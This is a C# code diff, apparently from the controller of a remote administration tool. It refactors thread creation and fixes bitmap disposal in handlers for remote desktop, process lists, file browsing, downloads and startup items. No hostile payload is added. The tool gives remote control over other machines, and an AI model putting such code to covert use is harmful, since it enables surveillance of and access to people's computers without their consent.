@@ -21,7 +21,7 @@ namespace xServer.Core.Commands
 			mainForm.ListenServer.AllTimeConnectedClients++;
 			mainForm.UpdateWindowTitle(mainForm.ListenServer.ConnectedClients, mainForm.lstClients.SelectedItems.Count);
 
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				try
 				{
@@ -52,7 +52,7 @@ namespace xServer.Core.Commands
 				}
 				catch
 				{ }
-			})).Start();
+			}).Start();
 		}
 
 		private static void ShowPopup(Client c, FrmMain mainForm)
@@ -62,7 +62,7 @@ namespace xServer.Core.Commands
 
 		public static void HandleStatus(Client client, Status packet, FrmMain mainForm)
 		{
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				foreach (ListViewItem lvi in mainForm.lstClients.Items)
 				{
@@ -77,12 +77,12 @@ namespace xServer.Core.Commands
 					}
 				}
 
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleUserStatus(Client client, UserStatus packet, FrmMain mainForm)
 		{
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				foreach (ListViewItem lvi in mainForm.lstClients.Items)
 				{
@@ -97,7 +97,7 @@ namespace xServer.Core.Commands
 					}
 				}
 
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
@@ -105,36 +105,36 @@ namespace xServer.Core.Commands
 			if (client.Value.FrmRdp == null)
 				return;
 
+			// we can not dispose all bitmaps here, cause they are later used again in `client.Value.LastDesktop`
 			if (client.Value.LastDesktop == null)
 			{
-                using (Bitmap newScreen = (Bitmap)Helper.Helper.CByteToImg(packet.Image))
-                {
-                    client.Value.LastDesktop = newScreen;
-                    client.Value.FrmRdp.Invoke((MethodInvoker)delegate
-                    {
-                        client.Value.FrmRdp.picDesktop.Image = newScreen;
-                    });
-                }
+				Bitmap newScreen = (Bitmap)Helper.Helper.CByteToImg(packet.Image);
+				client.Value.LastDesktop = newScreen;
+				client.Value.FrmRdp.Invoke((MethodInvoker)delegate
+				{
+					client.Value.FrmRdp.picDesktop.Image = newScreen;
+				});
+				newScreen = null;
 			}
 			else
 			{
-                using (Bitmap screen = (Bitmap)Helper.Helper.CByteToImg(packet.Image))
-                {
-                    using (Bitmap newScreen = new Bitmap(screen.Width, screen.Height))
-                    {
-                        using (Graphics g = Graphics.FromImage(newScreen))
-                        {
-                            g.DrawImage(client.Value.LastDesktop, 0, 0, newScreen.Width, newScreen.Height);
-                            g.DrawImage(screen, 0, 0, newScreen.Width, newScreen.Height);
-                        }
+				using (Bitmap screen = (Bitmap) Helper.Helper.CByteToImg(packet.Image))
+				{
+					Bitmap newScreen = new Bitmap(screen.Width, screen.Height);
 
-                        client.Value.LastDesktop = newScreen;
-                        client.Value.FrmRdp.Invoke((MethodInvoker)delegate
-                        {
-                            client.Value.FrmRdp.picDesktop.Image = newScreen;
-                        });
-                    }
-                }
+					using (Graphics g = Graphics.FromImage(newScreen))
+					{
+						g.DrawImage(client.Value.LastDesktop, 0, 0, newScreen.Width, newScreen.Height);
+						g.DrawImage(screen, 0, 0, newScreen.Width, newScreen.Height);
+					}
+
+					client.Value.LastDesktop = newScreen;
+					client.Value.FrmRdp.Invoke((MethodInvoker) delegate
+					{
+						client.Value.FrmRdp.picDesktop.Image = newScreen;
+					});
+					newScreen = null;
+				}
 			}
 
 			packet.Image = null;
@@ -151,7 +151,7 @@ namespace xServer.Core.Commands
 				client.Value.FrmTm.lstTasks.Items.Clear();
 			});
 
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				for (int i = 0; i < packet.Processes.Length; i++)
 				{
@@ -169,7 +169,7 @@ namespace xServer.Core.Commands
 						{ break; }
 					}
 				}
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleDrivesResponse(Client client, DrivesResponse packet)
@@ -195,7 +195,7 @@ namespace xServer.Core.Commands
 				client.Value.FrmFm.lstDirectory.Items.Clear();
 			});
 
-			new Thread(new ThreadStart(() =>
+			new Thread(() =>
 			{
 				ListViewItem lviBack = new ListViewItem(new string[] { "..", "", "Directory" });
 				lviBack.Tag = "dir";
@@ -254,7 +254,7 @@ namespace xServer.Core.Commands
 				}
 
 				client.Value.LastDirectorySeen = true;
-			})).Start();
+			}).Start();
 		}
 
 		public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
@@ -290,7 +290,7 @@ namespace xServer.Core.Commands
 
 			if (Continue)
 			{
-				new Thread(new ThreadStart(() =>
+				new Thread(() =>
 				{
 					try
 					{
@@ -311,7 +311,7 @@ namespace xServer.Core.Commands
 					}
 					catch
 					{ }
-				})).Start();
+				}).Start();
 			}
 			else
 			{
@@ -412,7 +412,7 @@ namespace xServer.Core.Commands
 					{
 						var temp = pair.Key.Split(new string[] { "||" }, StringSplitOptions.None);
 						var l = new ListViewItem(temp) {Group = client.Value.FrmStm.lstStartupItems.Groups[pair.Value], Tag = pair.Value};
-					    client.Value.FrmStm.lstStartupItems.Items.Add(l);
+						client.Value.FrmStm.lstStartupItems.Items.Add(l);
 					}
 				});
 			}
